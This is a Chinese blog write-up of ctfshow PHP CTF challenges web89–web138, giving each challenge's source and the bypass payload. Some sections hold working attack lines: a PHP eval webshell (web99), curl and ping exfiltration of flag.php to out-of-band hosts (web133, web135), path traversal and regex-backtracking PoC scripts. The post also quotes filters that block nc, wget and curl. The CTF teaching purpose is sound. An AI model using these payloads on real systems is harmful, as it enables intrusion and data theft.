## 写在前面
最近在二刷ctfshow的题目，一来是巩固一下基础知识，因为第一次做的时候完全是面向wp做；二来是写wp，弥补一下第一次刷题时走马观花似的的遗憾，不得不说，ctfshow太棒啦！
## web89（数组绕过）
```php
<?php

include("flag.php");
highlight_file(__FILE__);

if(isset($_GET['num'])){
    $num = $_GET['num'];
    if(preg_match("/[0-9]/", $num)){
        die("no no no!");
    }
    if(intval($num)){
        echo $flag;
    }
}
```
要求num中不能出现数字，而且intval后为不为0，这里要了解一下intval这个函数，它是用来获取变量的整形值，成功时返回 var 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。所以思路就很明确了
payload：/?num[]=0
## web90（进制绕过）
```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```
要求num不能等于字符串4476，而且十进制的整型值要为4476，也很容易，通过其他进制比如2进制、8进制或16进制绕过就行
payload：/?num=010574（前加0表示8进制）
/?num=0x117c（前加0x表示16进制）
/?num=0b1000101111100（前加0b表示2进制 php5.4+）
## web91（%0a绕过）
```php
<?php

show_source(__FILE__);
include('flag.php');
$a=$_GET['cmd'];
if(preg_match('/^php$/im', $a)){
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
else{
    echo 'nonononono';
}
```
注意观察第六和第七行的区别，在第一个判断中匹配多了一个/m，意味着多行匹配，第二个判断则没有，那么我们可以用换行符进行绕过，即满足第一个判断同时不满足第二个判断，换行符是%0a
payload：/?cmd=%0aphp
## web92（进制绕过）
```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```
要求num值不为数字4476，同时十进制值为4476，同样也可以用16进制等绕过
payload：/?num=0x117c
## web93（进制绕过）
```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```
与上一题大同小异，不过过滤了num中的字母，这样2进制和16进制都不能用，只能使用8进制
payload：/?num=010574
## web94（%0a绕过）
```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(!strpos($num, "0")){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```
增加了一个判断，要求0不能是num的第一个字符，很简单，换行符绕过即可，相当于填充了一个字符，除此之外，分页符%0c，制表符%09都是可以的
payload：/?num=%0a010574
## web95（%0a绕过）
```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]|\./i", $num)){
        die("no no no!!");
    }
    if(!strpos($num, "0")){
        die("no no no!!!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```
多过滤了点，但不影响上一题的payload
payload：/?num=%0a010574
## web96（同路径绕过）
```php
<?php

highlight_file(__FILE__);

if(isset($_GET['u'])){
    if($_GET['u']=='flag.php'){
        die("no no no");
    }else{
        highlight_file($_GET['u']);
    }

}

```
明显flag在flag.php中，但是又不能直接传入flag.php，已知flag在当前目录下，所以构造
payload：/?u=./flag.php
## web97（md5强碰撞绕过）
```php
<?php

include("flag.php");
highlight_file(__FILE__);
if (isset($_POST['a']) and isset($_POST['b'])) {
  if ($_POST['a'] != $_POST['b'])
    if (md5($_POST['a']) === md5($_POST['b']))
      echo $flag;
  else
    print 'Wrong.';
}
?>
```
要求传入a和b不等而md5值相等，小知识点，可以传入数组，md5后值为NULL，那么自然NULL=NULL满足条件
payload：a[]=1&b[]=2
## web98（三元运算符和传址）
```php

Notice: Undefined index: flag in /var/www/html/index.php on line 15

Notice: Undefined index: flag in /var/www/html/index.php on line 16

Notice: Undefined index: HTTP_FLAG in /var/www/html/index.php on line 17
<?php

include("flag.php");
$_GET?$_GET=&$_POST:'flag';
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);

?>
```
这个题乍一看有点乱，但是仔细分析还是挺好理解的，先看第10行，如果GET传参了那么接下来就变为POST请求，再看第13行要求$_GET['HTTP_FLAG']=='flag'，如果是POST请求那么就是$_POST['HTTP_FLAG']=='flag'，所以其实11、12行无关紧要，只要随便GET一个值然后再满足$_POST['HTTP_FLAG']=='flag'就行了
payload：
GET：/?1=1 
POST：HTTP_FLAG=flag
## web99（in_array）
```php
<?php

highlight_file(__FILE__);
$allow = array();
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
    file_put_contents($_GET['n'], $_POST['content']);
}

?>
```
这个题考察in_array函数，它没有设置第三个参数，默认是false，即不会检查类型是否相同，所以对于1和1.php的判断是等效的，那么就可以创建一个php文件，然后写入一句话木马
payload：
GET：/?n=1.php
POST：content=<?=eval($_POST['KonDream']);?>
然后上蚁剑也行网页直接读也行，我这里选择直接读，在1.php界面
payload：KonDream=system('tac flag*');
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637938584200-b51eab6d-2608-4ce0-80bb-62dc81c1d310.png)

## web100（优先级）
```php
<?php

highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
}
?>
```
很多人对第10行有一个误区啊，认为一定要v1v2v3都是数字才能满足v0=1，其实不然，在php中赋值的优先级是要比与运算高的，也就是说只要满足v1是数字v0就会被赋值为1，v2v3是什么并不影响v0；其次第5行说falg在ctfshow类里，那么其实可以v2就直接new一个ctfshow然后打印，php仍会执行，不要被第14行误导；最后v3传个分号满足判断条件即可
最后要注意将得到的flag中的0x2d换位-，因为0x2d对应的字符就是-，同时ctfshow的flag格式都是有-的，也算是一个小坑了
payload：/?v1=1&v2=var_dump(new ctfshow)&v3=;
## web101（Reflectionclass）
```php
<?php

highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)){
        if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }   
}
?>
```
主要过滤了v2的右括号，很多函数不能用了，这里考虑php的反射类，拼接而成报告ctfshow类的信息。需要注意的是，除了替换0x2d外，题目还少给了一位flag，那么就需要爆破最后一位字符0-f16次即可
payload：/?v1=1&v2=echo new Reflectionclass&v3=;
## web102（巧妙的构造）
```php
<?php

highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    file_put_contents($v3,$str);
}
else{
    die('hacker');
}

?>
```
这个题看了wp发现构造的十分巧妙，先看payload：
GET：
/?v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=2.php
POST：v1=hex2bin
解释一下这个payload

- v2的这一堆数字是什么意思呢？

第9行中取第二位以后的字符串，所以前面两个11作为填充，使$s为后面5044383959474e6864434171594473，那么第十行就变成了
```php
$str = call_user_func(hex2bin,5044383959474e6864434171594473); 
```
执行后$str为PD89YGNhdCAqYDs，那么第12行就变成
```php
file_put_contents(php://filter/write=convert.base64-decode/resource=2.php,PD89YGNhdCAqYDs);
```
PD89YGNhdCAqYDs经过base64解码是<?=`cat *`; 将当前目录所有文件内容都写入到2.php中，所以执行payload后，加载2.php并右键查看源码，即可看到flag

- 那为什么说他巧妙呢？别的命令为啥不行呢？

因为条件限制，v2必须是数字，虽然这个payload中v2有一个字符e，但是e会被解析成科学计数法，所以php还会将其认为是数字，即条件是满足的。那么如果构造其他命令呢？经过测试，先base64后hex2bin的命令中，很难找到或者压根找不到第二个能满足v2为数字的存在，至少群主大大没找到嘿嘿嘿，其实我也太菜了没找到Orz，所以说它构造巧妙，能解出这个题。
## web103（巧妙的构造）
```php
<?php

highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    if(!preg_match("/.*p.*h.*p.*/i",$str)){
        file_put_contents($v3,$str);
    }
    else{
        die('Sorry');
    }
}
else{
    die('hacker');
}

?>
```
这次不允许str中出现任何带有php的字符，影响不大，解法同上
payload：
GET：
/?v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=2.php
POST：v1=hex2bin
加载2.php后查看源代码即可
## web104（sha1弱碰撞绕过）
```php
<?php

highlight_file(__FILE__);
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2)){
        echo $flag;
    }
}
?>
```
说是sha1碰撞其实也和md5碰撞一样，毕竟都是哈希加密嘛，严格来说也不是碰撞，只是利用php特性来做而已，真要能碰撞出来我直接载入史册hhh（其实我是个正经人儿）
回归正题，数组绕过
GET：/?v2[]=2
POST：v1[]=1
不用数组也行，弱碰撞嘛，找到两个加密后以0e开头并且接下来30位都是数字的就行了，因为php会把0e开头的解析成科学计数法，全是数字的话直接为0，就满足相等条件，这里给两个例子：
aaK1STfY 0e76658526655756207688271159624026011393
aaO8zKZF 0e89257456677279068558073954252716165668
补充：其实这题也是没啥可碰撞的，v1和v2传个一样的值就行了= =。
## web105（变量覆盖）
```php
<?php

highlight_file(__FILE__);
include('flag.php');
error_reporting(0);
$error='你还想要flag嘛？';
$suces='既然你想要那给你吧！';
foreach($_GET as $key => $value){
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value;
}foreach($_POST as $key => $value){
    if($value==='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
if(!($_POST['flag']==$flag)){
    die($error);
}
echo "your are good".$flag."\n";
die($suces);

?>
你还想要flag嘛？
```
这题考察变量覆盖，主要是读懂$$key=$$value; 比如说我GET请求flag=a，那么会有如下变换：
第一步$key=flag；第二步$$key即$flag=$a，就相当于用$a的值把$flag的值给替换掉了。
这题$flag没有直接输出点，所以要通过第20行的die($error);或者第23行的die($suces);来输出，也就是说用$flag覆盖掉这两个其中一个的值。
那么思路就很明确了，首先GET请求/?a=flag，按照上面的理论，相当于$a=$flag，也就是说这个变量a的值就是答案flag，此时直接执行会发现请求了第20行die($error); 因为没有POST。那么我们再将error的值覆盖掉就好了，于是POST请求error=a，相当于$error=$a，而$a的值又是$flag的值，那么此时的输出就是$flag了，有一点绕，需要多读几遍理解。
最终payload：
GET：/?a=flag
POST：error=a
## web106（sha1弱碰撞）
```php
<?php

highlight_file(__FILE__);
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2) && $v1!=$v2){
        echo $flag;
    }
}
?>
```
还是弱碰撞，数组绕过
GET：/?v2[]=2
POST：v1[]=1
## web107（md5弱碰撞）
```php
<?php

highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if(isset($_POST['v1'])){
    $v1 = $_POST['v1'];
    $v3 = $_GET['v3'];
       parse_str($v1,$v2);
       if($v2['flag']==md5($v3)){
           echo $flag;
       }
}

?>
```
乍一看什么玩意，v2呢，仔细一看看错了，parse_str就是查询字符串并解析到变量里，第一个参数v1是要解析的字符串，第二个参数v2可选，意味存储变量的数组，所以就简单了，md5弱碰撞绕过
GET：/?v3=QNKCDZO
POST：v1=flag=0
v3经过md5解密后为0e开头的纯数字，会被php当做科学计数法解析成0；v1中字符串会被解析到数组v2中，即v2[flag]=0，0=0满足条件，执行输出。
## web108（ereg NULL截断）
```php
<?php

highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {
    die('error');

}
//只有36d的人才能看到flag
if(intval(strrev($_GET['c']))==0x36d){
    echo $flag;
}

?>
```
> ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。

ereg函数存在NULL截断漏洞，导致了正则过滤被绕过，所以可以使用%00截断正则匹配，0x36d的十进制为877，所以：
payload：?c=a%00778
## web109（Reflectionclass）
```php
<?php

highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
            eval("echo new $v1($v2());");
    }
}
?>
```
用反射类仍可以做，详见web101
payload：/?v1=Reflectionclass&v2=system('tac *')
也可以用异常处理类：/?v1=Exception&v2=system('tac *')
详见：[PHP异常处理（Exception）](http://c.biancheng.net/view/6253.html)
## web110（php内置类）
```php
<?php


highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)){
            die("error v2");
    }

    eval("echo new $v1($v2());");

}

?>
```
考察：php内置类 利用 FilesystemIterator 获取指定目录下的所有文件[https://www.php.net/manual/zh/class.filesystemiterator.php](https://www.php.net/manual/zh/class.filesystemiterator.php)
getcwd()函数 获取当前工作目录 返回当前工作目录 payload: ?v1=FilesystemIterator&v2=getcwd
最后访问fl36dga.txt即可
## web111（变量覆盖）
```php
<?php
  
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

function getFlag(&$v1,&$v2){
    eval("$$v1 = &$$v2;");
    var_dump($$v1);
}


if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v2)){
            die("error v2");
    }
    
    if(preg_match('/ctfshow/', $v1)){
            getFlag($v1,$v2);
    }
}
?>
```
第24行要求v1包含ctfshow，那么就GET一个ctfshow给v1，然后要想办法利用第9行将flag.php中的flag打印出来，考察点在于全局变量，即v2=GLOBALS，就能打印出flag.php中的变量值。
payload：/?v1=ctfshow&v2=GLOBALS
## web112（php://filter以及死亡绕过）
```php
<?php

highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/\.\.\/|http|https|data|input|rot13|base64|string/i',$file)){
        die("hacker!");
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```
payload：

1. /?file=php://filter/read/resource=flag.php
1. /?file=php://filter/convert.iconv.UCS-2LE.UCS-2LE/resource=flag.php
> 这个过滤器需要php支持 iconv ，而iconv是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。
> iconv — 字符串按要求的字符编码来转换
> UCS-2LE是小端每个字节两位存储，UCS-2LE.UCS-2LE表示小端输入，小端输出

3. /?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php
> convert.quoted-printable-encode和convert.quoted-printable-decode使用此过滤器的decode版本等同于用 quoted_printable_decode()函数处理所有的流数据。没有和convert.quoted-printable-encode相对应的函数。convert.quoted-printable-encode支持以一个关联数组给出的参数。除了支持和convert.base64-encode一样的附加参数外，convert.quoted-printable-encode还支持布尔参数binary和 force-encode-first。convert.base64-decode只支持line-break-chars参数作为从编码载荷中剥离的类型提示。

4. /?file=compress.zlib://flag.php 压缩过滤器
## web113（php://filter以及死亡绕过）
```php
<?php

highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/filter|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```
过滤了filter，使用压缩过滤器绕过
payload：/?file=compress.zlib://flag.php
## web114（php://filter以及死亡绕过）
```php
<?php

error_reporting(0);
highlight_file(__FILE__);
function filter($file){
    if(preg_match('/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
echo "师傅们居然tql都是非预期 哼！";
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
} 师傅们居然tql都是非预期 哼！
```
又不过滤filter了
payload：/?file=php://filter/read/resource=flag.php
## web115（%0c绕过）
```php
<?php

include('flag.php');
highlight_file(__FILE__);
error_reporting(0);
function filter($num){
    $num=str_replace("0x","1",$num);
    $num=str_replace("0","1",$num);
    $num=str_replace(".","1",$num);
    $num=str_replace("e","1",$num);
    $num=str_replace("+","1",$num);
    return $num;
}
$num=$_GET['num'];
if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){
    if($num=='36'){
        echo $flag;
    }else{
        echo "hacker!!";
    }
}else{
    echo "hacker!!!";
} hacker!!!
```
分页符绕过
payload：/?num=%0c36
## web123（变量名特性）
```php
<?php

error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?/", $c)&&$c<=18){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
?>
```
小知识点，在php中，变量名是不允许出现.的，如果变量名为CTF_SHOW.COM会变成CTF_SHOW_COM，但是如果变量名中出现了]，]会被转变为_而后面的字符不会改变，于是构造payload：
CTF_SHOW=1&CTF[SHOW.COM=1&fun=echo $flag
## web125（POST转GET逃逸）
```php
<?php

error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i", $c)&&$c<=16){
         eval("$c".";");
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
?>
```
打印函数被禁了，flag被禁了，考虑用GET请求逃逸正则匹配
POST：CTF_SHOW=1&CTF[SHOW.COM=1&fun=highlight_file($_GET[1])
GET：/?1=flag.php
## web126（变量覆盖）
```php
<?php

error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i", $c) && strlen($c)<=16){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}

```
payload：
POST：CTF_SHOW=1&CTF[SHOW.COM=1&fun=parse_str($a[1])
GET：/?a=1+fl0g=flag_give_me
parse_str是把查询字符串覆盖到变量中，这个题是将执行结果传回数组，+号分割，即a[0]=1，a[1]=fl0g=flag_give_me
## web127（变量特性）
```php
<?php

error_reporting(0);
include("flag.php");
highlight_file(__FILE__);
$ctf_show = md5($flag);
$url = $_SERVER['QUERY_STRING'];


//特殊字符检测
function waf($url){
    if(preg_match('/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\'|\"|\<|\,|\>|\.|\\\|\//', $url)){
        return true;
    }else{
        return false;
    }
}

if(waf($url)){
    die("嗯哼？");
}else{
    extract($_GET);
}


if($ctf_show==='ilove36d'){
    echo $flag;
}
```
payload：/?ctf show=ilove36d
算是一个小知识点了，经过测试发现ctf_show等同于ctf[show、ctf show、ctf.show、ctf+show，由于waf这里就只有空格可以用
## web128（gettext()拓展）
```php
<?php

error_reporting(0);
include("flag.php");
highlight_file(__FILE__);

$f1 = $_GET['f1'];
$f2 = $_GET['f2'];

if(check($f1)){
    var_dump(call_user_func(call_user_func($f1,$f2)));
}else{
    echo "嗯哼？";
}



function check($str){
    return !preg_match('/[0-9]|[a-z]/i', $str);
} NULL
```
小知识点： _()是一个函数
_()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll
get_defined_vars()函数
get_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flag
call_user_func — 把第一个参数作为回调函数调用，这也是为什么需要调用两次的原因
payload: ?f1=_&f2=get_defined_vars
## web129（目录穿越）
```php
<?php

error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['f'])){
    $f = $_GET['f'];
    if(stripos($f, 'ctfshow')>0){
        echo readfile($f);
    }
}
```
目录穿越，常规操作
payload：/?f=/ctfshow/../../../../../../../../var/www/html/flag.php
## web130（正则绕过）
```php
<?php

error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
    $f = $_POST['f'];

    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f, 'ctfshow') === FALSE){
        die('bye!!');
    }

    echo $flag;

}

```

- 非预期：POST：f=ctfshow

第9行由于匹配模式是.+?，意味着如果符合判断条件，那么ctfshow前面必须有一个字符，也就是说f=ctfshow是不满足判断条件的，所以可以绕过匹配。如果匹配模式是.*?，即出现零次或多次，那么非预期就行不通了

- 预期解：
> PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit，回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false，就自动绕过了正则表达式。

poc：
```php
'''
Author: KonDream
Date: 2021-11-30 12:50:57
LastEditors:  KonDream
LastEditTime: 2021-11-30 12:54:10
Description:  
'''

import requests

url = 'http://69fda5c2-d7bd-4eee-a840-25dc17ff48fd.challenge.ctf.show/'

data = {
    'f' : 'a' * 1000000 + 'ctfshow' 
}

r = requests.post(url=url, data=data)
print(r.text)
```
## web131（正则绕过）
```php
<?php

error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
    $f = (String)$_POST['f'];

    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f,'36Dctfshow') === FALSE){
        die('bye!!');
    }

    echo $flag;

}

```
取消了web130的非预期，上一题思路仍然可解
poc：
```php
'''
Author: KonDream
Date: 2021-11-30 12:58:00
LastEditors:  KonDream
LastEditTime: 2021-11-30 12:58:01
Description:  
'''
import requests

url = 'http://4fef2867-91b1-4f3c-aec0-3f96683cceb1.challenge.ctf.show/'

data = {
    'f' : 'a' * 1000000 + '36Dctfshow' 
}

r = requests.post(url=url, data=data)
print(r.text)
```
## web132（运算符优先级）
打开发现是个网页，看一眼robots文件，发现存在admin目录，于是访问/admin
```php
<?php

#error_reporting(0);
include("flag.php");
highlight_file(__FILE__);


if(isset($_GET['username']) && isset($_GET['password']) && isset($_GET['code'])){
    $username = (String)$_GET['username'];
    $password = (String)$_GET['password'];
    $code = (String)$_GET['code'];

    if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin"){
        
        if($code == 'admin'){
            echo $flag;
        }
        
    }
}
```
payload：?code=admin&password=0&username=admin
重点在第13行判断，仔细观察第二个运算符是或运算符，所以只要满足$username ==="admin"为真条件即可成立，username传参admin后，再满足$code == 'admin'就能输出flag
## web133（变量覆盖）
```php
<?php

error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("6个字母都还不够呀?!");
    }
}
```
限制了前六个字母，于是考虑变量覆盖，例如?F=`$F`;+xxx，就会执行xxx的内容，然后利用curl将flag带出即可
payload：
?F=`$F`;+curl -X POST -F xx=@flag.php http://alznj4ubyx9onw4yhplwurkgq7wxkm.burpcollaborator.net
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1638251223524-954d0748-6f59-4a6b-bf0d-e1d33c301551.png)
成功带出flag，参考链接：[https://blog.csdn.net/qq_46091464/article/details/109095382](https://blog.csdn.net/qq_46091464/article/details/109095382)

## web134（变量覆盖）
```php
<?php

highlight_file(__FILE__);
$key1 = 0;
$key2 = 0;
if(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {
    die("nonononono");
}
@parse_str($_SERVER['QUERY_STRING']);
extract($_POST);
if($key1 == '36d' && $key2 == '36d') {
    die(file_get_contents('flag.php'));
}
```
payload: ?_POST[key1]=36d&_POST[key2]=36d
利用点是 extract($_POST);，进行解析$_POST数组。 
第九行先将GET方法请求的解析成变量
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1638252782990-9fd15d97-585a-48bf-a92e-bb6d69188f0a.png)
然后在利用extract() 函数从数组中将变量导入到当前的符号表。 即$key1=36d，$key2=36d
查看源码后得到flag
## web135（变量覆盖）
```php
<?php

error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("师傅们居然破解了前面的，那就来一个加强版吧");
    }
}
```
133的升级版，这题也非预期了，原因是没禁用写权限
payload：/?F=`$F`; cp flag.php 1.txt
直接将flag写到了1.txt中，然后访问1.txt即可
预期解：通过Ping命令带出数据
/?F=`$F`;+ping `cat flag.php|awk 'NR==2'`.6x1sys.dnslog.cn
因为最终flag是两部分，所以通过awk NR一排一排的获得数据，但是这个方法我没有成功带出，还请成功的师傅指点一二
## web136（tee）
```php
<?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
?>
```
由于过滤了点，没办法保存成带后缀的文件，考虑tee命令
> Linux tee命令用于读取标准输入的数据，并将其内容输出成文件。
> tee指令会从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件。

payload: ls /|tee 1 访问1下载发现根目录下有flag payload: cat /f149_15_h3r3|tee 2 访问下载就OK
## web137（call_user_func）
```php
<?php

error_reporting(0);
highlight_file(__FILE__);
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}

call_user_func($_POST['ctfshow']);
```
没有过滤，调用getFlag即可
payload：ctfshow[0]=ctfshow&ctfshow[1]=getFlag或者ctfshow=ctfshow::getFlag
第一个payload相当于执行call_user_func(ctfshow,getflag)
## web138（call_user_func）
```php
<?php

error_reporting(0);
highlight_file(__FILE__);
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}

if(strripos($_POST['ctfshow'], ":")>-1){
    die("private function");
}

call_user_func($_POST['ctfshow']);
```
过滤了冒号
payload：ctfshow[0]=ctfshow&ctfshow[1]=getFlag
## web139（call_user_func）暂缓
```php
<?php
error_reporting(0);
function check($x){
